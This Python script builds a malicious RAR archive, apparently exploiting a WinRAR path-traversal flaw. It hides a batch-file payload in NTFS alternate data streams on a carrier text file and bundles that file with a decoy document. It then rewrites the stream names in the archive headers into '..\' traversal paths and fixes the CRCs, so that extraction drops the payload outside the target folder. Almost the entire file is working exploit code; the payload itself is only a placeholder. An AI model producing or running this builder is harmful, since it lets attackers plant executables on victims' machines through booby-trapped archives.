import os
import struct
import subprocess
import zlib
import sys
import shutil
from pathlib import Path
from typing import List

# --- Configuration ---
# The sacrificial text file that will carry all the ADS payloads.
TXT_CARRIER_FILENAME = "metadata.txt" 
TXT_CARRIER_CONTEXT = "123456"
NUM_DEPTHS = 1  # The number of traversal paths (and ADS streams) to create.
BASE_DROP_PATH = "..\\..\\.\\payload.bat"
PAYLOAD = "@echo off\necho Payload executed!\npause\n"
PLACEHOLDER_LEN = 150 # Ensure this is long enough for the longest path
OUT_RAR = "exploit.rar"

# --- Constants ---
RAR5_SIG = b"Rar!\x1A\x07\x01\x00"

def prepare_payload() -> Path:
    """Creates payload.bat."""
    payload = Path("payload.bat")
    payload.write_text(PAYLOAD, encoding="utf-8")
    return payload

def create_txt_carrier() -> Path:
    """Creates the simple .txt file to carry the ADS."""
    carrier = Path(TXT_CARRIER_FILENAME)
    carrier.write_text(TXT_CARRIER_CONTEXT, encoding="utf-8")
    return carrier

def attach_ads(carrier: Path, placeholder: str):
    """Attaches a payload stream to the carrier file."""
    ads_path = f"{carrier}:{placeholder}"
    with open(ads_path, "wb", buffering=0) as f:
        f.write(Path("payload.bat").read_bytes())

def find_rar() -> str:
    """Finds the WinRAR executable."""
    candidates = [r"C:\Program Files\WinRAR\rar.exe", r"C:\Program Files (x86)\WinRAR\rar.exe"]
    for d in os.environ.get("PATH", "").split(os.pathsep):
        if d and (p := Path(d) / "rar.exe").exists():
            return str(p)
    for c in candidates:
        if Path(c).exists():
            return c
    raise FileNotFoundError("rar.exe not found")

def create_base_rar(rar_exe: str, files_to_add: List[Path]) -> Path:
    """Creates a base RAR containing all specified files."""
    base_rar = Path("base.rar")
    if base_rar.exists():
        base_rar.unlink()
    files_str = " ".join(f'"{f}"' for f in files_to_add)
    subprocess.run(
        f'"{rar_exe}" a -ep -os "{base_rar}" {files_str}',
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True
    )
    return base_rar

def get_vint(buf: bytes, off: int) -> tuple[int, int]:
    val, shift, i = 0, 0, off
    while i < len(buf):
        b = buf[i]; i += 1
        val |= (b & 0x7F) << shift
        if (b & 0x80) == 0: break
        shift += 7
    return val, i - off

def patch_placeholder_in_header(hdr: bytearray, placeholder_utf8: bytes, target_utf8: bytes) -> int:
    """Finds and replaces a placeholder in a header."""
    needle = b":" + placeholder_utf8
    pos = hdr.find(needle)
    if pos < 0:
        return 0
    
    start_of_patch = pos + 1
    # Find the full placeholder name (including the numeric suffix)
    full_placeholder_in_hdr = b""
    for k in range(start_of_patch, len(hdr)):
        if hdr[k] == 0: break
        full_placeholder_in_hdr += bytes([hdr[k]])

    if len(target_utf8) > len(full_placeholder_in_hdr):
        raise ValueError("Replacement path is longer than the placeholder space.")

    hdr[start_of_patch : start_of_patch + len(target_utf8)] = target_utf8
    padding_len = len(full_placeholder_in_hdr) - len(target_utf8)
    if padding_len > 0:
        padding_start = start_of_patch + len(target_utf8)
        hdr[padding_start : padding_start + padding_len] = b"\x00" * padding_len
        
    return 1

def rebuild_all_header_crc(buf: bytearray):
    """Recalculates CRC for all headers."""
    pos = buf.find(RAR5_SIG) + len(RAR5_SIG)
    while pos + 4 <= len(buf):
        block_start = pos
        try:
            header_size, hsz_len = get_vint(buf, block_start + 4)
        except Exception: break
        
        header_start = block_start + 4 + hsz_len
        header_end = header_start + header_size
        if header_end > len(buf): break
        
        region = buf[block_start + 4:header_end]
        crc = zlib.crc32(region) & 0xFFFFFFFF
        struct.pack_into("<I", buf, block_start, crc)
        
        i = header_start
        _htype, n1 = get_vint(buf, i); i += n1
        hflags, n2 = get_vint(buf, i); i += n2
        if (hflags & 0x0001): _extrasz, n3 = get_vint(buf, i); i += n3
        datasz = 0
        if (hflags & 0x0002): datasz, n4 = get_vint(buf, i); i += n4
        pos = header_end + datasz

def build_relative_paths() -> List[str]:
    """Generates the list of traversal paths."""
    return [("..\\" * depth) + BASE_DROP_PATH for depth in range(1, NUM_DEPTHS + 1)]

# --- KEY CHANGE: Using the original, robust patching logic ---
def patch_rar(base_rar: Path, placeholder: str, relative_paths: List[str]) -> Path:
    """Sequentially patches each placeholder it finds."""
    print("Target paths to inject:")
    for path in relative_paths:
        print(f"  - {path}")
    
    data = bytearray(base_rar.read_bytes())
    placeholder_utf8 = placeholder.encode("utf-8")
    target_paths_utf8 = [p.encode("utf-8") for p in relative_paths]
    
    path_index_to_use = 0
    total_patches = 0
    pos = data.find(RAR5_SIG) + len(RAR5_SIG)

    while pos + 4 <= len(data) and path_index_to_use < len(target_paths_utf8):
        try:
            header_size, hsz_len = get_vint(data, pos + 4)
        except Exception: break
        
        header_start = pos + 4 + hsz_len
        header_end = header_start + header_size
        if header_end > len(data): break
        
        hdr = bytearray(data[header_start:header_end])
        target_utf8 = target_paths_utf8[path_index_to_use]
        
        # Search the current header for our placeholder base string.
        patches_in_this_header = patch_placeholder_in_header(hdr, placeholder_utf8, target_utf8)
        
        if patches_in_this_header > 0:
            data[header_start:header_end] = hdr
            total_patches += patches_in_this_header
            print(f"Patched stream for depth {path_index_to_use + 1}")
            path_index_to_use += 1 # Only move to the next path if we made a patch.
        
        i = header_start
        _htype, n1 = get_vint(data, i); i += n1
        hflags, n2 = get_vint(data, i); i += n2
        if (hflags & 0x0001): _extrasz, n3 = get_vint(data, i); i += n3
        datasz = 0
        if (hflags & 0x0002): datasz, n4 = get_vint(data, i); i += n4
        pos = header_end + datasz

    if total_patches < len(target_paths_utf8):
        print(f"Warning: Only patched {total_patches} of {len(target_paths_utf8)} streams.")

    rebuild_all_header_crc(data)
    final_rar = Path(OUT_RAR)
    final_rar.write_bytes(data)
    return final_rar

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} \"path\\to\\your\\decoy_file.pdf\"")
        sys.exit(1)

    decoy_file_path = Path(sys.argv[1])
    if not decoy_file_path.is_file():
        print(f"Error: Decoy file not found at '{decoy_file_path}'")
        sys.exit(1)

    print(f"Using '{decoy_file_path.name}' as the visual decoy.")
    payload = prepare_payload()
    txt_carrier = create_txt_carrier()
    
    # --- KEY CHANGE: Create multiple unique placeholders ---
    base_placeholder = "X" * (PLACEHOLDER_LEN - 5)
    placeholders = [f"{base_placeholder}{i:02d}" for i in range(NUM_DEPTHS)]
    
    print(f"Attaching {NUM_DEPTHS} ADS streams to '{txt_carrier.name}'...")
    for p in placeholders:
        attach_ads(txt_carrier, p)

    rar_exe = find_rar()
    print(f"Creating base RAR with '{decoy_file_path.name}' and '{txt_carrier.name}'...")
    create_base_rar(rar_exe, [decoy_file_path, txt_carrier])
    
    relative_paths = build_relative_paths()
    
    print("Patching RAR...")
    try:
        # We pass the common base part of the placeholder to the patching function.
        final_rar = patch_rar(Path("base.rar"), base_placeholder, relative_paths)
    except Exception as e:
        print(f"Patching failed: {e}")
        return
    finally:
        if Path("base.rar").exists(): Path("base.rar").unlink()
        payload.unlink()
        txt_carrier.unlink()
    
    print(f"\nExploit created: {final_rar}")
    print(f"Archive contains '{decoy_file_path.name}' and '{TXT_CARRIER_FILENAME}'.")
    print(f"The payload will attempt {NUM_DEPTHS} drops on extraction.")

if __name__ == "__main__":
    main()